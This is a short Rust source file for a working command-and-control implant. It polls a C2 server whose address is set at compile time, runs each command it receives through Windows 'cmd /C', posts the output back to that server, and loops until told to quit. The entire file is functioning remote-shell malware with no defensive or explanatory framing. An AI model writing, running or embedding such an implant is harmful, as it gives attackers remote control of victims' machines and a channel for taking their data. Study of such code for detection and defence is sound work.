use reqwest::Result;
use reqwest::blocking::Client;
use std::process::Command;
use std::time::Duration;
use std::{thread, time};

fn poll_command(client: &Client, url: &str) -> Result<String> {
    // Poll the C2 server to see if we have any waiting commands
    
    let res = client.get(url).send()?.text()?;
    Ok(res)
}

fn run_command(cmd: &str) -> String {
    match Command::new("cmd")
            .args(&["/C", cmd])
            .output() {
        Ok(output) => {
            let stdout = String::from_utf8(output.stdout).unwrap();
            return stdout
        }
        Err(e) => {
            return format!("Error: {}", e)
        }
    }
}

fn post_result(client: &Client, url: &str, output: String) -> Result<()> {
    client.post(url).body(output).send()?;
    Ok(())
}

fn main() -> Result<()>{

    let url = env!("C2_URL", "Set the C2_URL environment variable with the address of your C2 server");
    let timeout = Duration::new(5,0);
    let client = Client::builder().timeout(timeout).build()?;

    loop {
        // Check for commands
        match poll_command(&client, url) {
            Ok(cmd) if cmd != "quit" && cmd != "" => {
                let output = run_command(&cmd);
                post_result(&client, url, output)?;
                continue
            },
            Ok(cmd) if cmd == "quit" => {
                post_result(&client, url, "quitting".to_string())?;
                break
            },
            Err(_) => {
                println!("There has been an error")
            },
            Ok(_) => {
                
            }
        }
        thread::sleep(time::Duration::from_secs(10));
    }

    Ok(())
}
